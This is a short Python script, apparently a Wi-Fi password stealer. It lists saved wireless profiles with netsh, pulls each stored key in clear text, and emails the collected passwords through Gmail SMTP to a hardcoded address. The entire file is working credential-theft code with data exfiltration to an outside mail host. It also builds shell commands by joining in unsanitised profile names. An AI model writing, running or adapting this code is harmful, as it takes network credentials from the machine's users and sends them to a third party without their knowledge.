import re
import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for name in network_names:
    get_key = "netsh wlan show profile " + name + " key=clear"
    current_result = subprocess.check_output(get_key, shell=True)
    result = result + current_result


send_mail("trevorbarrow96@gmail.com", "test", result)
